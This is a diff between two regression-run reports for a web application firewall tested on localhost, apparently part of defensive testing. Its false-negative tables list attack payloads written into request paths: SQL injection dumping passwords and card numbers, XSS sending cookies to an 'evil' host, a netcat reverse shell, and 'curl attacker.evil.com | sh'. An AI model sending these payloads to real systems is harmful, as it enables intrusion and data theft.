@@ -1,126 +1,41 @@
 # Aegis-Gate r2 regression — run report (python runner)
 
-- **When:** 20260614-210530   **Target:** `http://localhost:8080`
-- **Total:** 1159 · **Pass:** 553 · **FN (attacks allowed):** 488 · **FP (benign blocked):** 8 · **Errors:** 0 · **Skipped:** 110
-- **Detection rate (pass / executed):** 52.7%
+- **When:** 20260614-221523   **Target:** `http://localhost:8080`
+- **Total:** 1159 · **Pass:** 650 · **FN (attacks allowed):** 297 · **FP (benign blocked):** 102 · **Errors:** 0 · **Skipped:** 110
+- **Detection rate (pass / executed):** 62.0%
 
 ## Per-class
 
 | Class | Total | Pass | FP | FN | Err | Skip | Detect%% |
 |---|--:|--:|--:|--:|--:|--:|--:|
-| auth-jwt | 61 | 27 | 0 | 34 | 0 | 0 | 44 |
-| benign-baseline | 99 | 91 | 8 | 0 | 0 | 0 | 92 |
-| caching | 33 | 19 | 0 | 14 | 0 | 0 | 58 |
-| cors | 24 | 6 | 0 | 18 | 0 | 0 | 25 |
-| injection-cmdi | 76 | 51 | 0 | 25 | 0 | 0 | 67 |
-| injection-nosql | 48 | 45 | 0 | 3 | 0 | 0 | 94 |
-| injection-sqli | 110 | 69 | 0 | 41 | 0 | 0 | 63 |
-| path-traversal | 51 | 50 | 0 | 1 | 0 | 0 | 98 |
-| protocol | 37 | 3 | 0 | 34 | 0 | 0 | 8 |
-| rate-limit | 94 | 0 | 0 | 6 | 0 | 88 | 0 |
-| sse | 92 | 1 | 0 | 69 | 0 | 22 | 1 |
-| ssrf | 32 | 28 | 0 | 4 | 0 | 0 | 88 |
-| websocket | 322 | 95 | 0 | 227 | 0 | 0 | 30 |
-| xss | 80 | 68 | 0 | 12 | 0 | 0 | 85 |
+| auth-jwt | 61 | 58 | 3 | 0 | 0 | 0 | 95 |
+| benign-baseline | 99 | 20 | 79 | 0 | 0 | 0 | 20 |
+| caching | 33 | 19 | 14 | 0 | 0 | 0 | 58 |
+| cors | 24 | 21 | 3 | 0 | 0 | 0 | 88 |
+| injection-cmdi | 76 | 67 | 0 | 9 | 0 | 0 | 88 |
+| injection-nosql | 48 | 48 | 0 | 0 | 0 | 0 | 100 |
+| injection-sqli | 110 | 78 | 0 | 32 | 0 | 0 | 71 |
+| path-traversal | 51 | 51 | 0 | 0 | 0 | 0 | 100 |
+| protocol | 37 | 36 | 0 | 1 | 0 | 0 | 97 |
+| rate-limit | 94 | 6 | 0 | 0 | 0 | 88 | 100 |
+| sse | 92 | 25 | 1 | 44 | 0 | 22 | 36 |
+| ssrf | 32 | 32 | 0 | 0 | 0 | 0 | 100 |
+| websocket | 322 | 118 | 2 | 202 | 0 | 0 | 37 |
+| xss | 80 | 71 | 0 | 9 | 0 | 0 | 89 |
 
-## ❌ False negatives — attacks that slipped through (488)
+## ❌ False negatives — attacks that slipped through (297)
 
 | id | class | method | path | rule |
 |---|---|---|---|---|
-| jwt-0013 | auth-jwt | GET | `/api/profile` | — |
-| jwt-0014 | auth-jwt | GET | `/admin/users` | — |
-| jwt-0015 | auth-jwt | GET | `/admin/dashboard` | — |
-| jwt-0016 | auth-jwt | POST | `/deposit` | — |
-| jwt-0017 | auth-jwt | GET | `/api/profile` | — |
-| jwt-0018 | auth-jwt | GET | `/admin/users` | — |
-| jwt-0019 | auth-jwt | GET | `/admin/dashboard` | — |
-| jwt-0020 | auth-jwt | POST | `/deposit` | — |
-| jwt-0021 | auth-jwt | GET | `/api/profile` | — |
-| jwt-0022 | auth-jwt | GET | `/admin/users` | — |
-| jwt-0023 | auth-jwt | GET | `/admin/dashboard` | — |
-| jwt-0024 | auth-jwt | POST | `/deposit` | — |
-| jwt-0025 | auth-jwt | GET | `/api/profile` | — |
-| jwt-0026 | auth-jwt | GET | `/admin/users` | — |
-| jwt-0027 | auth-jwt | GET | `/admin/dashboard` | — |
-| jwt-0028 | auth-jwt | POST | `/deposit` | — |
-| jwt-0029 | auth-jwt | GET | `/api/profile` | — |
-| jwt-0030 | auth-jwt | GET | `/admin/users` | — |
-| jwt-0031 | auth-jwt | GET | `/admin/dashboard` | — |
-| jwt-0032 | auth-jwt | POST | `/deposit` | — |
-| jwt-0033 | auth-jwt | GET | `/api/profile` | — |
-| jwt-0034 | auth-jwt | GET | `/admin/users` | — |
-| jwt-0035 | auth-jwt | GET | `/admin/dashboard` | — |
-| jwt-0036 | auth-jwt | POST | `/deposit` | — |
-| jwt-0049 | auth-jwt | GET | `/api/profile` | — |
-| jwt-0050 | auth-jwt | GET | `/admin/users` | — |
-| jwt-0051 | auth-jwt | GET | `/admin/dashboard` | — |
-| jwt-0052 | auth-jwt | POST | `/deposit` | — |
-| jwt-0053 | auth-jwt | GET | `/api/profile` | — |
-| jwt-0054 | auth-jwt | GET | `/admin/users` | — |
-| jwt-0055 | auth-jwt | GET | `/admin/dashboard` | — |
-| jwt-0056 | auth-jwt | POST | `/deposit` | — |
-| jwt-0057 | auth-jwt | GET | `/api/profile` | — |
-| jwt-0058 | auth-jwt | GET | `/api/profile` | — |
-| caching-0001 | caching | GET | `/static/js/app.js` | — |
-| caching-0002 | caching | GET | `/static/js/app.js` | — |
-| caching-0003 | caching | GET | `/static/js/app.js` | — |
-| caching-0004 | caching | GET | `/static/js/app.js` | — |
-| caching-0007 | caching | GET | `/static/js/app.js` | — |
-| caching-0008 | caching | GET | `/static/js/app.js` | — |
-| caching-0009 | caching | GET | `/api/profile/nonexistent.css` | — |
-| caching-0010 | caching | GET | `/api/profile;.css` | — |
-| caching-0011 | caching | GET | `/api/profile%0a.css` | — |
-| caching-0013 | caching | GET | `/admin/users.css` | — |
-| caching-0014 | caching | GET | `/api/transactions/x.js` | — |
-| caching-0016 | caching | GET | `/deposit/.css` | — |
-| caching-0017 | caching | GET | `/static/css/style.css?utm_source=evil&callback=alert` | — |
-| caching-0018 | caching | GET | `/static/js/app.js?;x=1` | — |
-| cors-0004 | cors | GET | `/api/profile` | — |
-| cors-0005 | cors | GET | `/api/transactions` | — |
-| cors-0006 | cors | GET | `/admin/users` | — |
-| cors-0007 | cors | GET | `/api/profile` | — |
-| cors-0008 | cors | GET | `/api/transactions` | — |
-| cors-0009 | cors | GET | `/admin/users` | — |
-| cors-0010 | cors | GET | `/api/profile` | — |
-| cors-0011 | cors | GET | `/api/transactions` | — |
-| cors-0012 | cors | GET | `/admin/users` | — |
-| cors-0016 | cors | GET | `/api/profile` | — |
-| cors-0017 | cors | GET | `/api/transactions` | — |
-| cors-0018 | cors | GET | `/admin/users` | — |
-| cors-0019 | cors | GET | `/api/profile` | — |
-| cors-0020 | cors | GET | `/api/transactions` | — |
-| cors-0021 | cors | GET | `/admin/users` | — |
-| cors-0022 | cors | GET | `/api/profile` | — |
-| cors-0023 | cors | GET | `/api/transactions` | — |
-| cors-0024 | cors | GET | `/admin/users` | — |
-| cmdi-0002 | injection-cmdi | POST | `/api/feedback` | — |
-| cmdi-0003 | injection-cmdi | POST | `/api/bet-reports/export` | — |
 | cmdi-0005 | injection-cmdi | GET | `/game/1?name=| id` | — |
-| cmdi-0006 | injection-cmdi | POST | `/api/feedback` | — |
-| cmdi-0007 | injection-cmdi | POST | `/api/bet-reports/export` | — |
-| cmdi-0010 | injection-cmdi | POST | `/api/feedback` | — |
-| cmdi-0011 | injection-cmdi | POST | `/api/bet-reports/export` | — |
 | cmdi-0013 | injection-cmdi | GET | `/game/1?name=& whoami` | — |
-| cmdi-0014 | injection-cmdi | POST | `/api/feedback` | — |
-| cmdi-0015 | injection-cmdi | POST | `/api/bet-reports/export` | — |
-| cmdi-0016 | injection-cmdi | GET | `/cgi-bin/%26%20whoami` | — |
 | cmdi-0017 | injection-cmdi | GET | `/game/1?name=&& cat /etc/passwd%00` | — |
 | cmdi-0029 | injection-cmdi | GET | `/game/1?name=; cat /etc/passwd` | — |
 | cmdi-0037 | injection-cmdi | GET | `/game/1?name=| nc 10.0.0.1 4444 -e /bin/sh` | — |
 | cmdi-0041 | injection-cmdi | GET | `/game/1?name=; curl http://attacker.evil.com/x | sh%00` | — |
-| cmdi-0050 | injection-cmdi | POST | `/api/feedback` | — |
-| cmdi-0051 | injection-cmdi | POST | `/api/bet-reports/export` | — |
-| cmdi-0052 | injection-cmdi | GET | `/cgi-bin/%3B%60reboot%60` | — |
 | cmdi-0057 | injection-cmdi | GET | `/game/1?name=; ping -c 10 127.0.0.1` | — |
 | cmdi-0061 | injection-cmdi | GET | `/game/1?name=|| sleep 5%00` | — |
 | cmdi-0065 | injection-cmdi | GET | `/game/1?name=; python -c 'import os;os.system("id")'%00` | — |
-| cmdi-0069 | injection-cmdi | GET | `/game/1?name=%3B%20busybox%20wget%20http%3A%2F%2Fx%2Fs` | — |
-| cmdi-0070 | injection-cmdi | POST | `/api/feedback` | — |
-| cmdi-0071 | injection-cmdi | POST | `/api/bet-reports/export` | — |
-| cmdi-0072 | injection-cmdi | GET | `/cgi-bin/%3B%20busybox%20wget%20http%3A%2F%2Fx%2Fs` | — |
-| nosql-0041 | injection-nosql | POST | `/login` | — |
-| nosql-0042 | injection-nosql | POST | `/login` | — |
-| nosql-0043 | injection-nosql | POST | `/otp` | — |
 | sqli-0001 | injection-sqli | GET | `/api/transactions?page=' OR '1'='1` | — |
 | sqli-0004 | injection-sqli | GET | `/game/1?name=' OR '1'='1` | — |
 | sqli-0009 | injection-sqli | GET | `/game/1?name=' oR 1=1--` | — |
@@ -129,7 +44,6 @@
 | sqli-0022 | injection-sqli | GET | `/api/transactions?limit=') Or ('1'='1` | — |
 | sqli-0023 | injection-sqli | GET | `/game/') Or ('1'='1` | — |
 | sqli-0024 | injection-sqli | GET | `/game/1?name=') OR ('1'='1` | — |
-| sqli-0025 | injection-sqli | POST | `/login` | — |
 | sqli-0026 | injection-sqli | GET | `/api/transactions?page=1' UnIoN SeLeCt uSeRnAmE,PaSsWoRd fRoM UsErS--` | — |
 | sqli-0033 | injection-sqli | GET | `/game/1 uNiOn sElEcT CaRd_nUmBeR,SsN FrOm uSeRs` | — |
 | sqli-0034 | injection-sqli | GET | `/game/1?name=1 uNiOn sElEcT CaRd_nUmBeR,SsN FrOm uSeRs` | — |
@@ -137,11 +51,8 @@
 | sqli-0038 | injection-sqli | GET | `/game/'; DrOp tAbLe tRaNsAcTiOnS;--` | — |
 | sqli-0041 | injection-sqli | GET | `/api/transactions?page=' AND SLEEP(5)--` | — |
 | sqli-0043 | injection-sqli | GET | `/game/' AND SLEEP(5)--` | — |
-| sqli-0046 | injection-sqli | GET | `/api/transactions?page=1%2520AND%25201%253DCONVERT%2528int%252C%2540%2` | — |
 | sqli-0047 | injection-sqli | GET | `/api/transactions?limit=1 AND 1=CONVERT(int,@@version)` | — |
 | sqli-0048 | injection-sqli | GET | `/game/1 AND 1=CONVERT(int,@@version)` | — |
-| sqli-0049 | injection-sqli | GET | `/game/1?name=1%20AND%201%3DCONVERT%28int%2C%40%40version%29` | — |
-| sqli-0050 | injection-sqli | POST | `/login` | — |
 | sqli-0054 | injection-sqli | GET | `/game/1?name=' oR '1'='1' /*` | — |
 | sqli-0056 | injection-sqli | GET | `/api/transactions?page=1' OrDeR By 8--` | — |
 | sqli-0061 | injection-sqli | GET | `/api/transactions?page=' uNiOn aLl sElEcT NuLl,nUlL,NuLl--` | — |
@@ -154,58 +65,10 @@
 | sqli-0079 | injection-sqli | GET | `/game/1?name=1;wAiTfOr dElAy '0:0:5'--` | — |
 | sqli-0081 | injection-sqli | GET | `/api/transactions?page=' oR 1=1 LiMiT 1 OfFsEt 1--` | — |
 | sqli-0082 | injection-sqli | GET | `/api/transactions?limit=' OR 1=1 LIMIT 1 OFFSET 1--` | — |
-| sqli-0096 | injection-sqli | GET | `/api/transactions?page=0x27206f7220313d31` | — |
-| sqli-0097 | injection-sqli | GET | `/api/transactions?limit=0X27206F7220313D31` | — |
-| sqli-0098 | injection-sqli | GET | `/game/0x27206f7220313d31` | — |
-| sqli-0099 | injection-sqli | GET | `/game/1?name=0x27206f7220313d31` | — |
-| sqli-0100 | injection-sqli | POST | `/login` | — |
 | sqli-0102 | injection-sqli | GET | `/api/transactions?limit=' OR 'x'='x' AND email IS NOT NULL--` | — |
 | sqli-0103 | injection-sqli | GET | `/game/' OR 'x'='x' AND email IS NOT NULL--` | — |
 | sqli-0108 | injection-sqli | GET | `/game/1' AnD ExTrAcTvAlUe(1,cOnCaT(0x7e,vErSiOn()))--` | — |
-| traversal-0051 | path-traversal | POST | `/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php` | — |
 | protocol-0002 | protocol | POST | `/api/feedback` | — |
-| protocol-0005 | protocol | GET | `/api/notifications/stream%0aX-Injected:evil` | — |
-| protocol-0006 | protocol | TRACE | `/` | — |
-| protocol-0007 | protocol | TRACE | `/api/profile` | — |
-| protocol-0008 | protocol | TRACE | `/admin/users` | — |
-| protocol-0009 | protocol | TRACK | `/` | — |
-| protocol-0010 | protocol | TRACK | `/api/profile` | — |
-| protocol-0011 | protocol | TRACK | `/admin/users` | — |
-| protocol-0012 | protocol | DEBUG | `/` | — |
-| protocol-0013 | protocol | DEBUG | `/api/profile` | — |
-| protocol-0014 | protocol | DEBUG | `/admin/users` | — |
-| protocol-0015 | protocol | CONNECT | `/` | — |
-| protocol-0016 | protocol | CONNECT | `/api/profile` | — |
-| protocol-0017 | protocol | CONNECT | `/admin/users` | — |
-| protocol-0018 | protocol | PROPFIND | `/` | — |
-| protocol-0019 | protocol | PROPFIND | `/api/profile` | — |
-| protocol-0020 | protocol | PROPFIND | `/admin/users` | — |
-| protocol-0021 | protocol | DELETE | `/` | — |
-| protocol-0022 | protocol | DELETE | `/api/profile` | — |
-| protocol-0023 | protocol | DELETE | `/admin/users` | — |
-| protocol-0024 | protocol | PATCH | `/` | — |
-| protocol-0025 | protocol | PATCH | `/api/profile` | — |
-| protocol-0026 | protocol | PATCH | `/admin/users` | — |
-| protocol-0027 | protocol | OPTIONS* | `/` | — |
-| protocol-0028 | protocol | OPTIONS* | `/api/profile` | — |
-| protocol-0029 | protocol | OPTIONS* | `/admin/users` | — |
-| protocol-0030 | protocol | GET | `/api/public/stats` | — |
-| protocol-0031 | protocol | GET | `/api/public/stats` | — |
-| protocol-0032 | protocol | GET | `/api/public/stats` | — |
-| protocol-0033 | protocol | GET | `/__control/state` | — |
-| protocol-0034 | protocol | POST | `/__control/reset` | — |
-| protocol-0035 | protocol | POST | `/__control/error_mode` | — |
-| protocol-0036 | protocol | POST | `/__control/slow` | — |
-| protocol-0037 | protocol | GET | `/` | — |
-| limit-0001 | rate-limit | POST | `/login` | — |
-| limit-0002 | rate-limit | POST | `/api/feedback` | — |
-| limit-0003 | rate-limit | POST | `/otp` | — |
-| limit-0004 | rate-limit | GET | `/game/1` | — |
-| limit-0005 | rate-limit | GET | `/api/public/stats` | — |
-| limit-0006 | rate-limit | POST | `/login` | — |
-| sse-0002 | sse | GET | `/api/notifications/stream` | — |
-| sse-0003 | sse | GET | `/api/notifications/stream` | — |
-| sse-0004 | sse | GET | `/api/notifications/stream%0aX-Injected:evil` | — |
 | sse-0005 | sse | GET | `/api/notifications/stream` | — |
 | sse-0006 | sse | GET | `/api/notifications/stream` | — |
 | sse-0007 | sse | GET | `/api/notifications/stream` | — |
@@ -250,61 +113,10 @@
 | sse-0068 | sse | GET | `/api/notifications/stream\r\nX-Injected: evil` | — |
 | sse-0069 | sse | GET | `/api/notifications/stream X-Injected: evil` | — |
 | sse-0070 | sse | GET | `/api/notifications/stream\r\nX-Injected: evil` | — |
-| sse-0071 | sse | GET | `/api/notifications/stream` | — |
-| sse-0072 | sse | GET | `/api/notifications/stream` | — |
-| sse-0073 | sse | GET | `/api/notifications/stream` | — |
-| sse-0074 | sse | GET | `/api/notifications/stream` | — |
-| sse-0075 | sse | GET | `/api/notifications/stream` | — |
-| sse-0076 | sse | GET | `/api/notifications/stream` | — |
-| sse-0077 | sse | GET | `/api/notifications/stream` | — |
-| sse-0078 | sse | GET | `/api/notifications/stream` | — |
-| sse-0079 | sse | GET | `/api/notifications/stream` | — |
-| sse-0080 | sse | GET | `/api/notifications/stream` | — |
-| sse-0081 | sse | GET | `/api/notifications/stream` | — |
-| sse-0082 | sse | GET | `/api/notifications/stream` | — |
-| sse-0083 | sse | GET | `/api/notifications/stream` | — |
-| sse-0084 | sse | GET | `/api/notifications/stream` | — |
-| sse-0085 | sse | GET | `/api/notifications/stream` | — |
-| sse-0086 | sse | GET | `/api/notifications/stream` | — |
-| sse-0087 | sse | GET | `/api/notifications/stream` | — |
-| sse-0088 | sse | GET | `/api/notifications/stream` | — |
-| sse-0089 | sse | GET | `/api/notifications/stream` | — |
-| sse-0090 | sse | GET | `/api/notifications/stream` | — |
-| sse-0091 | sse | GET | `/api/notifications/stream` | — |
-| sse-0092 | sse | GET | `/api/notifications/stream` | — |
-| ssrf-0025 | ssrf | POST | `/api/integrations/preview` | — |
-| ssrf-0026 | ssrf | POST | `/game/1/play` | — |
-| ssrf-0029 | ssrf | POST | `/api/integrations/preview` | — |
-| ssrf-0030 | ssrf | POST | `/game/1/play` | — |
-| websocket-0003 | websocket | GET | `/ws/live` | — |
-| websocket-0004 | websocket | GET | `/ws/live` | — |
-| websocket-0005 | websocket | GET | `/ws/live` | — |
-| websocket-0006 | websocket | GET | `/ws/live` | — |
-| websocket-0007 | websocket | GET | `/ws/live` | — |
-| websocket-0009 | websocket | GET | `/ws/live` | — |
-| websocket-0011 | websocket | GET | `/admin/users` | — |
-| websocket-0012 | websocket | GET | `/deposit` | — |
-| websocket-0013 | websocket | GET | `/ws/live` | — |
-| websocket-0015 | websocket | GET | `/ws/live` | — |
 | websocket-0016 | websocket | GET | `/ws/live` | — |
-| websocket-0017 | websocket | GET | `/ws/live` | — |
-| websocket-0018 | websocket | GET | `/ws/live` | — |
 | websocket-0020 | websocket | GET | `/ws/live` | — |
 | websocket-0021 | websocket | GET | `/ws/live` | — |
-| websocket-0022 | websocket | GET | `/ws/live` | — |
-| websocket-0023 | websocket | GET | `/ws/live` | — |
-| websocket-0024 | websocket | GET | `/ws/live` | — |
-| websocket-0025 | websocket | GET | `/ws/live` | — |
-| websocket-0026 | websocket | GET | `/ws/live` | — |
-| websocket-0027 | websocket | GET | `/ws/live` | — |
-| websocket-0028 | websocket | GET | `/ws/live` | — |
-| websocket-0029 | websocket | GET | `/ws/live` | — |
 | websocket-0030 | websocket | GET | `/ws/live` | — |
-| websocket-0031 | websocket | GET | `/ws/live` | — |
-| websocket-0032 | websocket | GET | `/ws/live` | — |
-| websocket-0034 | websocket | GET | `/ws/live` | — |
-| websocket-0035 | websocket | GET | `/ws/live` | — |
-| websocket-0036 | websocket | GET | `/ws/live` | — |
 | websocket-0037 | websocket | GET | `/ws/live` | — |
 | websocket-0038 | websocket | GET | `/ws/live` | — |
 | websocket-0039 | websocket | GET | `/ws/live` | — |
@@ -506,39 +318,127 @@
 | xss-0005 | xss | GET | `/game/1?name=<ImG SrC=X OnErRoR=AlErT(1)>` | — |
 | xss-0013 | xss | GET | `/game/1?name="><ScRiPt>aLeRt(dOcUmEnT.CoOkIe)</sCrIpT>` | — |
 | xss-0025 | xss | GET | `/game/1?name=<IfRaMe sRc=jAvAsCrIpT:AlErT(1)>` | — |
-| xss-0029 | xss | GET | `/game/1?name=%253Ca%2520href%253D%2522javascript%253Aalert%25281%2529%` | — |
 | xss-0041 | xss | GET | `/game/1?name=<img src=x onerror=fetch('//evil/'+document.cookie)>` | — |
 | xss-0045 | xss | GET | `/game/1?name=<DeTaIlS OpEn oNtOgGlE=AlErT(1)>` | — |
 | xss-0049 | xss | GET | `/game/1?name=<svg><animate onbegin=alert(1)>` | — |
 | xss-0053 | xss | GET | `/game/1?name=<MaRqUeE OnStArT=AlErT(1)>` | — |
 | xss-0061 | xss | GET | `/game/1?name=<ViDeO><sOuRcE OnErRoR=AlErT(1)>` | — |
-| xss-0065 | xss | GET | `/game/1?name=%253Cscript%253Eeval%2528atob%2528%2527YWxlcnQoMSk%253D%2` | — |
-| xss-0069 | xss | GET | `/game/1?name=%253Cscr%253Cscript%253Eipt%253Ealert%25281%2529%253C%252` | — |
 | xss-0077 | xss | GET | `/game/1?name=<svg/onload=alert`1`>` | — |
 
 **Slipped-through by evasion technique:**
 
 ```
-  32  evasion:raw
-  25  evasion:mixed-case
-  11  evasion:urlencode
-   6  evasion:double-urlencode
-   5  evasion:nullbyte-suffix
-   2  evasion:sql-comment
+  24  evasion:mixed-case
+  22  evasion:raw
+   4  evasion:nullbyte-suffix
 ```
 
-## ⚠️ False positives — benign blocked (8)
+## ⚠️ False positives — benign blocked (102)
 
 | id | class | method | path | rule |
 |---|---|---|---|---|
+| jwt-0059 | auth-jwt | GET | `/api/public/stats` | — |
+| jwt-0060 | auth-jwt | GET | `/api/public/stats` | — |
+| jwt-0061 | auth-jwt | GET | `/api/public/stats` | — |
+| baseline-0001 | benign-baseline | POST | `/login` | — |
+| baseline-0002 | benign-baseline | POST | `/otp` | — |
+| baseline-0003 | benign-baseline | POST | `/login` | — |
+| baseline-0004 | benign-baseline | POST | `/otp` | — |
+| baseline-0005 | benign-baseline | POST | `/login` | — |
+| baseline-0006 | benign-baseline | POST | `/otp` | — |
+| baseline-0018 | benign-baseline | GET | `/game/list` | — |
+| baseline-0019 | benign-baseline | GET | `/health` | — |
+| baseline-0020 | benign-baseline | GET | `/` | — |
+| baseline-0021 | benign-baseline | GET | `/about` | — |
+| baseline-0022 | benign-baseline | GET | `/sitemap.xml` | — |
+| baseline-0023 | benign-baseline | GET | `/api/public/stats` | — |
+| baseline-0025 | benign-baseline | GET | `/game/1` | — |
+| baseline-0026 | benign-baseline | GET | `/game/2` | — |
+| baseline-0027 | benign-baseline | GET | `/game/3` | — |
+| baseline-0028 | benign-baseline | GET | `/game/4` | — |
+| baseline-0029 | benign-baseline | GET | `/game/5` | — |
+| baseline-0038 | benign-baseline | GET | `/game/1?name=Alice` | — |
+| baseline-0039 | benign-baseline | GET | `/game/1?name=O%27Brien` | — |
+| baseline-0040 | benign-baseline | GET | `/game/1?name=Jean-Luc` | — |
+| baseline-0041 | benign-baseline | GET | `/game/1?name=Ana%C3%AFs` | — |
+| baseline-0042 | benign-baseline | GET | `/game/1?name=%E6%9D%8E%E9%9B%B7` | — |
+| baseline-0043 | benign-baseline | GET | `/game/1?name=Smith%20%26%20Co` | — |
+| baseline-0044 | benign-baseline | GET | `/game/1?name=5%20%3C%2010%20fan` | — |
+| baseline-0045 | benign-baseline | GET | `/game/1?name=user_42` | — |
 | baseline-0046 | benign-baseline | POST | `/deposit` | — |
 | baseline-0047 | benign-baseline | POST | `/deposit` | — |
 | baseline-0048 | benign-baseline | POST | `/deposit` | — |
 | baseline-0049 | benign-baseline | POST | `/deposit` | — |
 | baseline-0050 | benign-baseline | POST | `/withdrawal` | — |
 | baseline-0051 | benign-baseline | POST | `/withdrawal` | — |
+| baseline-0052 | benign-baseline | POST | `/game/1/play` | — |
+| baseline-0053 | benign-baseline | POST | `/game/1/play` | — |
+| baseline-0054 | benign-baseline | POST | `/game/1/play` | — |
+| baseline-0055 | benign-baseline | PUT | `/api/profile` | — |
+| baseline-0056 | benign-baseline | PUT | `/api/profile` | — |
+| baseline-0057 | benign-baseline | PUT | `/api/profile` | — |
+| baseline-0058 | benign-baseline | PUT | `/user/settings` | — |
+| baseline-0059 | benign-baseline | POST | `/api/feedback` | — |
+| baseline-0060 | benign-baseline | POST | `/api/feedback` | — |
+| baseline-0061 | benign-baseline | POST | `/api/feedback` | — |
+| baseline-0062 | benign-baseline | POST | `/api/feedback` | — |
+| baseline-0063 | benign-baseline | POST | `/api/feedback` | — |
+| baseline-0064 | benign-baseline | POST | `/api/feedback` | — |
+| baseline-0065 | benign-baseline | POST | `/api/rewards/claim` | — |
+| baseline-0066 | benign-baseline | POST | `/api/bet-reports/export` | — |
+| baseline-0067 | benign-baseline | POST | `/api/bet-reports/export` | — |
+| baseline-0068 | benign-baseline | POST | `/api/bet-reports/export` | — |
+| baseline-0069 | benign-baseline | GET | `/static/js/app.js` | — |
+| baseline-0070 | benign-baseline | GET | `/static/css/style.css` | — |
+| baseline-0071 | benign-baseline | GET | `/assets/logo.png` | — |
+| baseline-0072 | benign-baseline | GET | `/public/terms.html` | — |
+| baseline-0073 | benign-baseline | GET | `/public/faq.html` | — |
+| baseline-0074 | benign-baseline | GET | `/favicon.ico` | — |
+| baseline-0075 | benign-baseline | OPTIONS | `/api/public/stats` | — |
+| baseline-0076 | benign-baseline | POST | `/api/kyc/document` | — |
+| baseline-0077 | benign-baseline | POST | `/api/analytics/events` | — |
 | baseline-0078 | benign-baseline | POST | `/deposit` | — |
+| baseline-0079 | benign-baseline | POST | `/deposit` | — |
+| baseline-0080 | benign-baseline | POST | `/deposit` | — |
+| baseline-0081 | benign-baseline | POST | `/deposit` | — |
+| baseline-0082 | benign-baseline | POST | `/deposit` | — |
+| baseline-0083 | benign-baseline | POST | `/deposit` | — |
+| baseline-0084 | benign-baseline | POST | `/deposit` | — |
+| baseline-0085 | benign-baseline | POST | `/game/2/play` | — |
+| baseline-0086 | benign-baseline | POST | `/game/3/play` | — |
+| baseline-0087 | benign-baseline | POST | `/game/4/play` | — |
+| baseline-0088 | benign-baseline | POST | `/game/5/play` | — |
+| baseline-0089 | benign-baseline | POST | `/game/1/play` | — |
 | baseline-0090 | benign-baseline | PUT | `/api/profile` | — |
+| baseline-0091 | benign-baseline | PUT | `/api/profile` | — |
+| baseline-0092 | benign-baseline | PUT | `/api/profile` | — |
+| baseline-0093 | benign-baseline | PUT | `/api/profile` | — |
+| baseline-0094 | benign-baseline | PUT | `/api/profile` | — |
+| baseline-0095 | benign-baseline | POST | `/api/analytics/events` | — |
+| baseline-0096 | benign-baseline | POST | `/api/analytics/events` | — |
+| baseline-0097 | benign-baseline | POST | `/api/analytics/events` | — |
+| baseline-0098 | benign-baseline | GET | `/api/public/stats` | — |
+| baseline-0099 | benign-baseline | HEAD | `/health` | — |
+| caching-0020 | caching | GET | `/static/js/app.js` | — |
+| caching-0021 | caching | GET | `/static/js/app.js` | — |
+| caching-0022 | caching | GET | `/static/css/style.css` | — |
+| caching-0023 | caching | GET | `/static/css/style.css` | — |
+| caching-0024 | caching | GET | `/assets/logo.png` | — |
+| caching-0025 | caching | GET | `/assets/logo.png` | — |
+| caching-0026 | caching | GET | `/public/terms.html` | — |
+| caching-0027 | caching | GET | `/public/terms.html` | — |
+| caching-0028 | caching | GET | `/public/faq.html` | — |
+| caching-0029 | caching | GET | `/public/faq.html` | — |
+| caching-0030 | caching | GET | `/sitemap.xml` | — |
+| caching-0031 | caching | GET | `/sitemap.xml` | — |
+| caching-0032 | caching | GET | `/favicon.ico` | — |
+| caching-0033 | caching | GET | `/favicon.ico` | — |
+| cors-0001 | cors | OPTIONS | `/api/public/stats` | — |
+| cors-0002 | cors | OPTIONS | `/api/public/stats` | — |
+| cors-0003 | cors | OPTIONS | `/api/public/stats` | — |
+| sse-0001 | sse | GET | `/api/notifications/stream` | — |
+| websocket-0001 | websocket | GET | `/ws/live` | — |
+| websocket-0002 | websocket | GET | `/ws/live` | — |
 
 ---
-_per-case log: run-20260614-210530.jsonl · summary: run-20260614-210530.summary.json_
+_per-case log: run-20260614-221523.jsonl · summary: run-20260614-221523.summary.json_
